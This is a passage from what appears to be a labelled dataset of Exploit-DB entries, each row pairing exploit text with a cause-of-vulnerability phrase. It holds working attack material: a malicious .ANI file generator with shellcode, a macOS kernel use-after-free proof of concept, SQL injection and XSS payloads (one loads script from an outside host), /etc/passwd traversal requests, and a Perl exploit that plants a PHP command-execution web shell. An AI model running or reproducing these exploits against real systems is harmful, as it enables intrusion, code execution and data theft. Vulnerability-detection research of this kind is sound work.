""\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f"" ""\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a"" ""\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76"" ""\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65"" ""\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78"" ""\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f"" ""\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65"" ""\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d"" ""\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31"" ""\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69"" ""\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61"" ""\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70"" ""\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42"";  char szIntro[] = ""\n\t\tWindows .ANI LoadAniIcon Stack Overflow\n"" ""\t\t\tdevcode (c) 2007\n"" ""[+] Targets:\n"" ""\t(1) Windows XP SP2\n"" ""\t(2) Kernel32.dll (ExitProcess)\n"" ""\t(3) Windows 2K SP4\n\n"" ""Usage: ani.exe <target> <file>"";  typedef struct { 	const char *szTarget; 	unsigned char uszRet[5]; } TARGET;  TARGET targets[] = { 	{ ""Windows XP SP2"", ""\xC9\x29\xD4\x77"" },				/* call esp */ 	{ ""Kernel32.dll (ExitProcess)"", ""\x90\x90\x90\x90"" },	/* ExitProcess */ 	{ ""Windows 2K SP4"", ""\x29\x4C\xE1\x77"" } };  int main( int argc, char **argv ) { 	char szBuffer[1024]; 	FILE *f; 	void *pExitProcess[4];  	if ( argc < 3 ) { 		printf(""%s\n"", szIntro ); 		return 0; 	}  	if ( atoi( argv[1] ) == 1 ) { 		printf(""[+] Getting ExitProcess address...\n""); 		*pExitProcess = GetProcAddress( GetModuleHandle( ""kernel32.dll"" ),  ""ExitProcess"" ); 		if ( pExitProcess == NULL ) { 			printf(""[-] Cannot get ExitProcess address\n""); 			return 0; 		} 		memcpy( targets[1].uszRet, pExitProcess, 4 ); 	}  	printf(""[+] Creating ANI header...\n""); 	memset( szBuffer, 0x90, sizeof( szBuffer ) ); 	memcpy( szBuffer, uszAniHeader, sizeof( uszAniHeader ) - 1 );  	printf(""[+] Copying shellcode...\n""); 	memcpy( szBuffer + 168, targets[atoi( argv[1] )].uszRet, 4 ); 	memcpy( szBuffer + 192, uszShellcode, sizeof( uszShellcode ) - 1 );  	f = fopen( argv[2], ""wb"" ); 	if ( f == NULL ) { 		printf(""[-] Cannot create file\n""); 		return 0; 	}  	fwrite( szBuffer, 1, 1024, f ); 	fclose( f ); 	printf(""[+] .ANI file succesfully created!\n""); 	return 0; }  // milw0rm.com [2007-03-31]","a stack overflow error within the ""LoadAniIcon() "" [user32.dll] function",1
5521,"SugarCRM Community Edition 4.5.1/5.0.0 - File Disclosure Name                          SugarCRM â€“ Local File Disclosure SugarCRM                      http://www.sugarcrm.com/docs/Release_Notes/OpenSource_ReleaseNotes_4.5.1j/ Advisories                    Sugar_Release_Notes_4.5.1j.2.6.html (Bug 20522)                               http://dl.sugarforge.org/sugarcrm/SugarCE5.0Latest/SugarCE5.0.0/                               Sugar_CommunityEdition_ReleaseNotes_5.0c.pdf (Bug 20342) Date Released                 4.5.1j in March 24, 2008 and 5.0.0c in April 4, 2008 Affected Software             SugarCRM - Community Edition Version 5.0.0                               SugarCRM â€“ Community Edition Version 4.5.1 Researcher                    Roberto Suggi Liverani roberto.suggi@security-assessment.com  Description SugarCRM Community Edition is vulnerable to local file contents disclosure. This  vulnerability can be exploited by a malicious user to disclose potentially sensitive  information. The flaw is caused due to a lack of input filtering in the SugarCRM RSS  module, which can be exploited to disclose the content of local files. The RSS module allows SugarCRM users to add RSS feeds to their personal RSS list. The application expects an URL value pointing to a valid RSS feed. However, the URL variable value is not properly sanitised and any URI value can be entered instead. In this particular case, it was discovered that it is possible to enter a file path to any files on the local system hosting the SugarCRM application. As a result SugarCRM does not display the new RSS feed in the list as it is not a valid RSS URL Feed. However, the application creates a local file with the filename of the md5 hash of the URL entered. The file is created in the directory cache/feeds . If the Apache web server is used, the file is created with the user www-data containing read permission.  Exploitation An exploitation example in a LAMP (Linux, Apache, Mysql, PHP) environment: If an authenticated attacker enters a value of â€œ/etc/passwdâ€ (without quotes) in the RSS URL field, the application will generate a MD5 hash of the string containing the file path. In this case, the value â€œ/etc/passwdâ€ is hashed to â€œc5068b7c2b1707f8939b283a2758a691â€ (without quotes). The MD5 hash is then used as a filename with the file contents of /etc/passwd. The file /etc/passwd can then be viewable publicly at http://sugarwebsiteaddress/cache/feeds/c5068b7c2b1707f8939b283a2758a691 .  Exploitation of this flaw does not require authentication. The URL variable is handled by the /modules/Feeds/Feed.php page. The array variable $url is passed without filtering to the xml_domit_rss_document function at the following line: $rssdoc = new xml_domit_rss_document ($this->url, â€˜cache/feeds/â€™, 3600); The XML domit RSS plugin is then called and retrieves the file content at the path given and then generate the MD5 hashed file in the cache/feeds folder as instructed by the function in Feed.php .  Solution Install the vendor supplied patches. Patch 4.5.1j: http://www.sugarcrm.com/forums/showthread.php?t=31688 Patch 5.0.0c: http://www.sugarcrm.com/forums/showthread.php?t=32252  About Security-Assessment.com Security-Assessment.com is Australasiaâ€™s leading team of Information Security consultants specialising in providing high quality Information Security services to clients throughout the Asia Pacific region. Our clients include some of the largest globally recognised companies in areas such as finance, telecommunications, broadcasting, legal and government. Our aim is to provide the very best independent advice and a high level of technical expertise while creating long and lasting professional relationships with our clients. Security-Assessment.com is committed to security research and development, and its team continues to identify and responsibly publish vulnerabilities in public and private software vendor's products. Members of the Security-Assessment.com R&D team are globally recognised through their release of whitepapers and presentations related to new security research.  For further information on this issue or any of our service offerings, contact us Web     www.security-assessment.com Email   info@security-assessment.com Phone   +649 302 5093  # milw0rm.com [2008-04-29]",a lack of input filtering in the SugarCRM RSS module,1
39377,"Apple Mac OSX / iOS - Unsandboxable Kernel Use-After-Free in Mach Vouchers /* Source: https://code.google.com/p/google-security-research/issues/detail?id=553  The mach voucher subsystem fails to correctly handle spoofed no-more-senders messages.  ipc_kobject_server will be called for mach messages sent to kernel-owned mach ports. If the msgh_id of the message can't be found in the mig_buckets hash table then this function calls ipc_kobject_notify. Note that this is the same code path which would be taken for a real no-more-senders notification message but there's nothing stopping user-space from also just sending one.  ipc_kobject_notify calls the correct notification method for the type of the KOBJECT associated with the port:   boolean_t ipc_kobject_notify(                    mach_msg_header_t *request_header,                    mach_msg_header_t *reply_header) {     ipc_port_t port = (ipc_port_t) request_header->msgh_remote_port;          ((mig_reply_error_t *) reply_header)->RetCode = MIG_NO_REPLY;     switch (request_header->msgh_id) {         case MACH_NOTIFY_NO_SENDERS:             if (ip_kotype(port) == IKOT_VOUCHER) {                 ipc_voucher_notify(request_header);         <-- called unconditionally irregardless of the value of ip_srights                 return TRUE;             }  At this point there are also no locks held.  void ipc_voucher_notify(mach_msg_header_t *msg) {   mach_no_senders_notification_t *notification = (void *)msg;   ipc_port_t port = notification->not_header.msgh_remote_port;   ipc_voucher_t iv;    assert(ip_active(port));   assert(IKOT_VOUCHER == ip_kotype(port));   iv = (ipc_voucher_t)port->ip_kobject;    ipc_voucher_release(iv); }   ipc_voucher_notify calls ipc_voucher_release, again not taking any locks, which calls through to iv_release:  void ipc_voucher_release(ipc_voucher_t voucher) {   if (IPC_VOUCHER_NULL != voucher)     iv_release(voucher); }   static inline void iv_release(ipc_voucher_t iv) {   iv_refs_t refs;    assert(0 < iv->iv_refs);   refs = hw_atomic_sub(&iv->iv_refs, 1);   if (0 == refs)     iv_dealloc(iv, TRUE); }  iv_release decrements the reference count field at +0x8 of the voucher object, and if it's zero frees it via iv_dealloc.  We can send two spoofed no-more-senders notifications to a voucher mach port which will race each other to iv_release, one will free iv (via iv_dealloc) then the second will execute hw_atomic_sub and decrement the reference count field of a free'd object.  With sufficient effort you could reallocate something else over the free'd ipc_voucher_t; you could then decrement the field at +0x8 (and if that resulted in that field being zero you could free it.)  You should enable kernel zone poisoning with the ""-zp"" boot arg to repro this.  You should see a panic message like this: panic(cpu 2 caller 0xffffff800712922b): ""a freed zone element has been modified in zone ipc vouchers: expected 0xdeadbeefdeadbeef but found 0xdeadbeefdeadbeee, bits changed 0x1, at offset 8 of 80 in element   This is consistent with the hw_atomic_sub call decrementing the refcount of a free'd object.  Tested on OS X ElCapitan 10.11 (15A284)  Presumably this is there on iOS too; I will update this bug if I can repro it there. I don't think there are any MAC hooks in the voucher subsystem so this should break you out of any sandboxes into the kernel.  Note that you might have to leave the repro running for a little while to win the race. */  // ianbeer  /* OS X and iOS unsandboxable kernel use-after-free in mach vouchers  The mach voucher subsystem fails to correctly handle spoofed no-more-senders messages.  ipc_kobject_server will be called for mach messages sent to kernel-owned mach ports. If the msgh_id of the message can't be found in the mig_buckets hash table then this function calls ipc_kobject_notify. Note that this is the same code path which would be taken for a real no-more-senders notification message but there's nothing stopping user-space from also just sending one.  ipc_kobject_notify calls the correct notification method for the type of the KOBJECT associated with the port:   boolean_t ipc_kobject_notify(                    mach_msg_header_t *request_header,                    mach_msg_header_t *reply_header) {     ipc_port_t port = (ipc_port_t) request_header->msgh_remote_port;          ((mig_reply_error_t *) reply_header)->RetCode = MIG_NO_REPLY;     switch (request_header->msgh_id) {         case MACH_NOTIFY_NO_SENDERS:             if (ip_kotype(port) == IKOT_VOUCHER) {                 ipc_voucher_notify(request_header);         <-- called unconditionally irregardless of the value of ip_srights                 return TRUE;             }  At this point there are also no locks held.  void ipc_voucher_notify(mach_msg_header_t *msg) {   mach_no_senders_notification_t *notification = (void *)msg;   ipc_port_t port = notification->not_header.msgh_remote_port;   ipc_voucher_t iv;    assert(ip_active(port));   assert(IKOT_VOUCHER == ip_kotype(port));   iv = (ipc_voucher_t)port->ip_kobject;    ipc_voucher_release(iv); }   ipc_voucher_notify calls ipc_voucher_release, again not taking any locks, which calls through to iv_release:  void ipc_voucher_release(ipc_voucher_t voucher) {   if (IPC_VOUCHER_NULL != voucher)     iv_release(voucher); }   static inline void iv_release(ipc_voucher_t iv) {   iv_refs_t refs;    assert(0 < iv->iv_refs);   refs = hw_atomic_sub(&iv->iv_refs, 1);   if (0 == refs)     iv_dealloc(iv, TRUE); }  iv_release decrements the reference count field at +0x8 of the voucher object, and if it's zero frees it via iv_dealloc.  We can send two spoofed no-more-senders notifications to a voucher mach port which will race each other to iv_release, one will free iv (via iv_dealloc) then the second will execute hw_atomic_sub and decrement the reference count field of a free'd object.  With sufficient effort you could reallocate something else over the free'd ipc_voucher_t; you could then decrement the field at +0x8 (and if that resulted in that field being zero you could free it.)  You should enable kernel zone poisoning with the ""-zp"" boot arg to repro this.  You should see a panic message like this: panic(cpu 2 caller 0xffffff800712922b): ""a freed zone element has been modified in zone ipc vouchers: expected 0xdeadbeefdeadbeef but found 0xdeadbeefdeadbeee, bits changed 0x1, at offset 8 of 80 in element   This is consistent with the hw_atomic_sub call decrementing the refcount of a free'd object.  Tested on OS X ElCapitan 10.11 (15A284)  Presumably this is there on iOS too; I will update this bug if I can repro it there. I don't think there are any MAC hooks in the voucher subsystem so this should break you out of any sandboxes into the kernel.  Note that you might have to leave the repro running for a little while to win the race. */   #include <stdio.h> #include <stdlib.h>  #include <mach/mach.h> #include <mach/thread_act.h>  #include <pthread.h> #include <unistd.h>  int start = 0;  void go(void* arg){   mach_port_t v = 0xb03; // <-- works for me; ymmv      mach_msg_header_t msg = {0};   msg.msgh_size = sizeof(mach_msg_header_t);   msg.msgh_local_port = v;   msg.msgh_remote_port = v;   msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);   msg.msgh_id = 0106;    while(start == 0){;}    usleep(1);    mach_msg(&msg,            MACH_SEND_MSG,            msg.msgh_size,            0,            MACH_PORT_NULL,            MACH_MSG_TIMEOUT_NONE,            MACH_PORT_NULL); } int main() {   //char port_num[20] = {0};   //gets(port_num);   //mach_port_t v = (mach_port_t)atoi(port_num);   //printf(""%x\n"", v);    pthread_t t;   int arg = 0;   pthread_create(&t, NULL, (void*) go, (void*) &arg);    mach_port_t v = 0xb03;      mach_msg_header_t msg = {0};   msg.msgh_size = sizeof(mach_msg_header_t);   msg.msgh_local_port = v;   msg.msgh_remote_port = v;   msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);   msg.msgh_id = 0106;    usleep(100000);    start = 1;    mach_msg(&msg,            MACH_SEND_MSG,            msg.msgh_size,            0,            MACH_PORT_NULL,            MACH_MSG_TIMEOUT_NONE,            MACH_PORT_NULL);    pthread_join(t, NULL);    return 0; }",The mach voucher subsystem fails to correctly handle spoofed no-more-senders messages,1
24104,"Tutorials Manager 1.0 - Multiple SQL Injections source: https://www.securityfocus.com/bid/10314/info  Reportedly Tutorials Manager is affected by multiple SQL injection vulnerabilities. These issues are due to a failure of the application to properly sanitize user-supplied input.  These SQL injection issues might allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information such as the administrator password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.  http://www.example.com/guides/index.php?lang=0&CODE=02&id=1[SQL] http://www.example.com/guides/index.php?lang=0&CODE=01&id=1[SQL] http://www.example.com/guides/index.php?lang=0&CODE=14&id=1[SQL] http://www.example.com/guides/admin.php?s=[SOMETHING]&act=own http://www.example.com/sites/guides/admin.php?s=[SOMETHING]&act=admin&CODE=01  Passing the input ' OR 1=1 /* through the 'username' filed of the 'admin.php' script is reported to grant unauthorized administrator access to the affected application.",a failure of the application to properly sanitize user-supplied input,1
34731,"DragDropCart - '/includes/ajax/getstate.php?prefix' Cross-Site Scripting source: https://www.securityfocus.com/bid/43478/info   DragDropCart is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/demo/includes/ajax/getstate.php?country=1&prefix=1>""><ScRiPt %0A%0D>alert(712244301211)%3B</ScRiPt>",fails to sufficiently sanitize user-supplied data,1
36383,WordPress Plugin flash-album-gallery - 'facebook.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/50861/info  flash-album-gallery plug-in for WordPress is prone to a cross-site-scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/[path]/wp-content/plugins/flash-album-gallery/facebook.php?i=[xss],fails to sufficiently sanitize user-supplied data,1
47103,"Microsoft DirectWrite / AFDKO - Heap-Based Out-of-Bounds Read/Write in OpenType Font Handling Due to Empty ROS Strings -----=====[ Background ]=====-----  AFDKO (Adobe Font Development Kit for OpenType) is a set of tools for examining, modifying and building fonts. The core part of this toolset is a font handling library written in C, which provides interfaces for reading and writing Type 1, OpenType, TrueType (to some extent) and several other font formats. While the library existed as early as 2000, it was open-sourced by Adobe in 2014 on GitHub [1, 2], and is still actively developed. The font parsing code can be generally found under afdko/c/public/lib/source/*read/*.c in the project directory tree.  At the time of this writing, based on the available source code, we conclude that AFDKO was originally developed to only process valid, well-formatted font files. It contains very few to no sanity checks of the input data, which makes it susceptible to memory corruption issues (e.g. buffer overflows) and other memory safety problems, if the input file doesn't conform to the format specification.  We have recently discovered that starting with Windows 10 1709 (Fall Creators Update, released in October 2017), Microsoft's DirectWrite library [3] includes parts of AFDKO, and specifically the modules for reading and writing OpenType/CFF fonts (internally called cfr/cfw). The code is reachable through dwrite!AdobeCFF2Snapshot, called by methods of the FontInstancer class, called by dwrite!DWriteFontFace::CreateInstancedStream and dwrite!DWriteFactory::CreateInstancedStream. This strongly indicates that the code is used for instancing the relatively new variable fonts [4], i.e. building a single instance of a variable font with a specific set of attributes. The CreateInstancedStream method is not a member of a public COM interface, but we have found that it is called by d2d1!dxc::TextConvertor::InstanceFontResources, which led us to find out that it can be reached through the Direct2D printing interface. It is unclear if there are other ways to trigger the font instancing functionality.  One example of a client application which uses Direct2D printing is Microsoft Edge. If a user opens a specially crafted website with an embedded OpenType variable font and decides to print it (to PDF, XPS, or another physical or virtual printer), the AFDKO code will execute with the attacker's font file as input. Below is a description of one such security vulnerability in Adobe's library exploitable through the Edge web browser.  -----=====[ Description ]=====-----  While fuzzing the standard ""tx"" AFDKO utility using a ""tx -cff <input file> /dev/null"" command, we have encountered multiple crashes in the CFF Writer (cfw) component of the FDK. These crashes are triggered in the cfwSindexAssignSID() function in the afdko/c/public/lib/source/cffwrite/cffwrite_sindex.c file:  --- cut ---    158  /* Assign the next custom SID to the specified custom string. */    159  SID cfwSindexAssignSID(cfwCtx g, SRI index) {    160      sindexCtx h = g->ctx.sindex;    161      if (index < STD_STR_CNT) {    162          return index;    163      } else {    164          CustomRec *custom = &h->custom.array[index - STD_STR_CNT];    165          if (custom->sid == SID_UNDEF) {    166              custom->sid = h->nextid++;    167          }    168          return custom->sid;    169      }    170  } --- cut ---  In all cases, the exception is thrown in line 165, and is caused by an out-of-bounds access to h->custom.array[] due to the ""index"" argument being equal to 65535 (0xffff). The two different invocations of cfwSindexAssignSID() which trigger the crash are found in the cfwDictFillTop() function in cffwrite/cffwrite_dict.c (lines 520 and 522):  --- cut ---    517      /* ROS */    518      if (top->sup.flags & ABF_CID_FONT) {    519          cfwDictSaveInt(dst,    520                         cfwSindexAssignSID(g, (SRI)top->cid.Registry.impl));    521          cfwDictSaveInt(dst,    522                         cfwSindexAssignSID(g, (SRI)top->cid.Ordering.impl));    523          cfwDictSaveInt(dst, top->cid.Supplement);    524          cfwDictSaveOp(dst, cff_ROS);    525      } --- cut ---  The cause of the problem is that the top->cid.Registry.impl and/or top->cid.Ordering.impl fields are set to 0xffff while executing the above code, and they are treated as valid indexes into h->custom.array, even though they contain the special marker values.  The ""Registry"" and ""Ordering"" strings are initialized when a cff_ROS operator is encountered while loading an input DICT structure in readDICT (cffread/cffread.c):  --- cut ---   1287                      case cff_ROS:   1288                          CHKUFLOW(3);   1289                          top->cid.Registry.ptr = sid2str(h, (SID)INDEX_INT(0));   1290                          top->cid.Ordering.ptr = sid2str(h, (SID)INDEX_INT(1));   1291                          top->cid.Supplement = INDEX_INT(2);   1292                          h->flags |= CID_FONT;   1293                          break; --- cut ---  Later on, these strings are added to the string index of the output font in cfwDictCopyTop (cffwrite/cffwrite_dict.c):  --- cut ---    193      /* Add strings to index */    194      addString(g, &dst->version); [...]    204      addString(g, &dst->cid.Registry);    205      addString(g, &dst->cid.Ordering);    206  } --- cut ---  where addString() is defined as:  --- cut ---     59  /* Add string to string index. */     60  static void addString(cfwCtx g, abfString *str) {     61      str->impl = cfwSindexAddString(g, str->ptr);     62  } --- cut ---  where in turn cfwSindexAddString() is defined as (cffwrite/cffwrite_sindex.c):  --- cut ---     99  /* Add string. If standard string return its SID, otherwise if in table return    100     existing record index, else add to table and return new record index. If    101     string is empty return SRI_UNDEF. */    102  SRI cfwSindexAddString(cfwCtx g, char *string) {    103      sindexCtx h = g->ctx.sindex;    104      size_t index;    105      StdRec *std;    106    107      if (string == NULL || *string == '\0') {    108          return SRI_UNDEF; /* Reject invalid strings */    109      } [...] --- cut ---  As a result, it should be possible to set cid.Registry.impl and/or cid.Ordering.impl to SRI_UNDEF (0xffff) with non-existent or empty strings. The cfwEndFont() function attempts to protect against this situation by checking if the string pointers are not equal to ABF_UNSET_PTR:  --- cut ---   1875          /* Validate CID data */   1876          if (top->cid.Registry.ptr == ABF_UNSET_PTR ||   1877              top->cid.Ordering.ptr == ABF_UNSET_PTR ||   1878              top->cid.Supplement == ABF_UNSET_INT) {   1879              return cfwErrBadDict;   1880          } --- cut ---  However these checks are insufficient, as it is still possible to make cfwSindexAddString() return SRI_UNDEF for correctly initialized, but empty strings. This results in passing 0xffff as an argument to cfwSindexAssignSID(), which triggers out-of-bounds reads in lines 165 and 168 in cffwrite_sindex.c, and potentially an OOB write in line 166. Under specific conditions, this may lead to memory corruption and arbitrary code execution.  -----=====[ Proof of Concept ]=====-----  The CFF table inside the proof of concept poc.otf font has the strings ""Adobe"" and ""Identity"" (corresponding to the Registry and Ordering fields) modified to ""\0dobe"" and ""\0dentity"". As the strings appear to be empty to cfwSindexAddString(), the SRI_UNDEF value is returned and later passed to cfwSindexAssignSID(), which triggers a crash.  The font is also specially crafted to parse correctly with DirectWrite but trigger the bug in AFDKO. The original CFF2 table was left untouched, and another, modified CFF table from an external CID-keyed font was added with the tag ""CFF "". This way, DirectWrite successfully loads the legitimate variable font, and AFDKO processes the modified version as the CFF table takes precedence over CFF2 due to the logic implemented in srcOpen() in afdko/c/public/lib/source/cffread/cffread.c.  -----=====[ Crash logs ]=====-----  A 64-bit build of ""tx"", started with ./tx -cff poc.otf crashes in the following way:  --- cut --- Program received signal SIGSEGV, Segmentation fault. 0x0000000000424ac2 in cfwSindexAssignSID (g=0x6fd890, index=65535) at ../../../../../source/cffwrite/cffwrite_sindex.c:165 165             if (custom->sid == SID_UNDEF) {  (gdb) print custom $1 = (CustomRec *) 0x81cb40 (gdb) print custom->sid Cannot access memory at address 0x81cb48 (gdb) print index $2 = 65535  (gdb) x/10i $rip => 0x424ac2 <cfwSindexAssignSID+98>:    movzwl 0x8(%rax),%ecx    0x424ac6 <cfwSindexAssignSID+102>:   cmp    $0xffff,%ecx    0x424acc <cfwSindexAssignSID+108>:   jne    0x424af3 <cfwSindexAssignSID+147>    0x424ad2 <cfwSindexAssignSID+114>:   mov    -0x20(%rbp),%rax    0x424ad6 <cfwSindexAssignSID+118>:   mov    0x90(%rax),%cx    0x424add <cfwSindexAssignSID+125>:   mov    %cx,%dx    0x424ae0 <cfwSindexAssignSID+128>:   add    $0x1,%dx    0x424ae4 <cfwSindexAssignSID+132>:   mov    %dx,0x90(%rax)    0x424aeb <cfwSindexAssignSID+139>:   mov    -0x28(%rbp),%rax    0x424aef <cfwSindexAssignSID+143>:   mov    %cx,0x8(%rax) (gdb) info reg $rax rax            0x81cb40 8506176  (gdb) bt #0  0x0000000000424ac2 in cfwSindexAssignSID (g=0x6fd890, index=65535) at ../../../../../source/cffwrite/cffwrite_sindex.c:165 #1  0x0000000000421b94 in cfwDictFillTop (g=0x6fd890, dst=0x71b3f0, top=0x71b148, font0=0x7ffff75b9010, iSyntheticBase=-1)     at ../../../../../source/cffwrite/cffwrite_dict.c:520 #2  0x000000000041b6db in fillSet (h=0x6fdbd0) at ../../../../../source/cffwrite/cffwrite.c:1059 #3  0x000000000041ae7c in cfwEndSet (g=0x6fd890) at ../../../../../source/cffwrite/cffwrite.c:2128 #4  0x000000000047a79c in cff_EndSet (h=0x6f6010) at ../../../../../source/tx_shared/tx_shared.c:1076 #5  0x000000000040533f in doSingleFileSet (h=0x6f6010, srcname=0x7fffffffdf1b ""poc.otf"")     at ../../../../source/tx.c:489 #6  0x0000000000402f59 in parseArgs (h=0x6f6010, argc=2, argv=0x7fffffffdc20) at ../../../../source/tx.c:558 #7  0x0000000000401df2 in main (argc=2, argv=0x7fffffffdc20) at ../../../../source/tx.c:1631 (gdb) --- cut ---  A similar Microsoft Edge renderer process crash is also shown below:  --- cut --- (4c7c.2a54): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. DWrite!cfwSindexAssignSID+0x21: 00007ffc`c59ea471 663984caccf3ffff cmp     word ptr [rdx+rcx*8-0C34h],ax ds:000001b6`7296ed24=????  0:037> ? rcx Evaluate expression: 65535 = 00000000`0000ffff 0:037> ? rdx Evaluate expression: 1883117648224 = 000001b6`728ef960  0:037> k  # Child-SP          RetAddr           Call Site 00 00000080`c43ab518 00007ffc`c59eb0e1 DWrite!cfwSindexAssignSID+0x21 01 00000080`c43ab520 00007ffc`c59e01cd DWrite!cfwDictFillTop+0x179 02 00000080`c43ab570 00007ffc`c59e219d DWrite!fillSet+0x61 03 00000080`c43ab5e0 00007ffc`c59d2314 DWrite!cfwEndSet+0x51 04 00000080`c43ab620 00007ffc`c596157a DWrite!AdobeCFF2Snapshot+0x23c 05 00000080`c43abb20 00007ffc`c5960729 DWrite!FontInstancer::InstanceCffTable+0x212 06 00000080`c43abd00 00007ffc`c596039a DWrite!FontInstancer::CreateInstanceInternal+0x249 07 00000080`c43abf20 00007ffc`c5945a4e DWrite!FontInstancer::CreateInstance+0x192 08 00000080`c43ac280 00007ffc`d4ae61ab DWrite!DWriteFontFace::CreateInstancedStream+0x9e 09 00000080`c43ac310 00007ffc`d4ad9148 d2d1!dxc::TextConvertor::InstanceFontResources+0x19f 0a 00000080`c43ac430 00007ffc`b4465464 d2d1!dxc::CXpsPrintControl::Close+0xc8 0b 00000080`c43ac480 00007ffc`b443fd30 edgehtml!CDXPrintControl::Close+0x44 0c 00000080`c43ac4d0 00007ffc`b44448bd edgehtml!CTemplatePrinter::EndPrintD2D+0x5c 0d 00000080`c43ac500 00007ffc`b431b995 edgehtml!CPrintManagerTemplatePrinter::endPrint+0x2d 0e 00000080`c43ac530 00007ffc`b3f79485 edgehtml!CFastDOM::CMSPrintManagerTemplatePrinter::Trampoline_endPrint+0x45 0f 00000080`c43ac570 00007ffc`b34344c1 edgehtml!CFastDOM::CMSPrintManagerTemplatePrinter::Profiler_endPrint+0x25 [...] --- cut ---  -----=====[ References ]=====-----  [1] https://blog.typekit.com/2014/09/19/new-from-adobe-type-open-sourced-font-development-tools/ [2] https://github.com/adobe-type-tools/afdko [3] https://docs.microsoft.com/en-us/windows/desktop/directwrite/direct-write-portal [4] https://medium.com/variable-fonts/https-medium-com-tiro-introducing-opentype-variable-fonts-12ba6cd2369   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47103.zip",the input file doesn't conform to the format specification,1
28015,"iFusion iFlance 1.1 - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/18399/info  iFlance is prone to multiple input-validation vulnerabilities because it fails to properly sanitize user-supplied input to the application.   An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker to steal cookie-based authentication credentials and launch other attacks.  This issue affects version 1.1; other versions may also be vulnerable.  http://www.example.com/account/acc_verify.php?vk=""><SCRIPT%20SRC=http://ha.ckers.org/xss.js></SCRIPT><""&verify=verify",fails to properly sanitize user-supplied input to the application,1
28124,"MKPortal 1.0.1 - 'index.php' Directory Traversal source: https://www.securityfocus.com/bid/18707/info  MKPortal is prone to a directory-traversal vulnerability because it fails to properly sanitize user-supplied input.   An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the affected application. Information obtained may aid in further attacks.  This issue affects version 1.0.1 Final; other versions may also be vulnerable.  #!/usr/bin/perl -w # MKPortal 1.0.1 Final (index.php) File Include Vulnerability # # Discovered & Coded By rUnViRuS # World Defacers TeaM # WD-members: rUnViRuS - Papipsycho - BlackWHITE - r3v3ng4ns - Net^ViruS # Details # ======= # Note : MKPortal 1.0.1 Final (index.php) File Include Vulnerability # # # .$ind = $ibforums->input['ind']; if ($ind) # . # . http://www.site.com/index.php?ind=../../../../../../../../../../../../etc/passwd%00 #  # Join with us to Get Prvi8 Exploit # Priv8 Priv8 Priv8 Priv8 # -------- ~~~~*~~~~ -------- use IO::Socket;   print ""\n=============================================================================\r\n"";  print "" * MKPortal 1.0.1 Final (index.php) File Include Vulnerability by www.worlddefacers.de *\r\n"";     print ""=============================================================================\r\n""; print ""\n\n[*] WD-members: rUnViRuS - Papipsycho - BlackWHITE -r3v3ng4ns \n""; print ""[*] Bug On :MKPortal 1.0.1 Final Software \n""; print ""[*] Discovered & Coded By : rUnViRuS\n""; print ""[*] Join with us to Get Prvi8 Exploit \n""; print ""[*] www.worlddefacers.de\n\n\n"";  print ""============================================================================\r\n"";  print ""		  -=Coded by Zod, Bug Found by rUnViRuS=-\r\n"";  print ""	       www.worlddefacers.de - www.vb00.com\r\n"";  print ""============================================================================\r\n""; sub main::urlEncode {     my ($string) = @_;     $string =~ s/(\W)/""%"" . unpack(""H2"", $1)/ge;     #$string# =~ tr/.//;     return $string;  }  $serv=$ARGV[0]; $path=$ARGV[1]; $cmd=""""; for ($i=2; $i<=$#ARGV; $i++) {$cmd.=""%20"".urlEncode($ARGV[$i]);};  if (@ARGV < 3) { print ""Usage:\r\n""; print ""\n\n[*] usage: WD-MKP.pl <host> <Path> <cmd>\n""; 	print ""[*] usage: WD-MKP.pl www.HosT.com /MKPortal/ ../../../../../../../../../../../../etc/passwd \n""; print ""[*] total 3280 drwxr-x--- 18 thegymr nobody 4096 Oct 9 2005 \n""; exit(); }    $sock = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$serv"", Timeout  => 10, PeerPort=>""http(80)"")   or die ""[+] Connecting ... Could not connect to host.\n\n"";    $shell='<?php ob_clean();echo""Hi Master!\r\n"";ini_set(""max_execution_time"",0);passthru($_GET[CMD]);die;?>';   $shell=urlEncode($shell);   $data=""loginname=sun&passwd=sun"";   print $sock ""POST 